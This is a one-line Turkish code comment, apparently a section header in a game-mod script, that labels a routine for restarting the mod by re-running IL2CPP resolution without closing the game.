 // ===== MODU YENIDEN BASLAT (oyunu kapatmadan il2cpp cozumunu tekrar calistir) =====
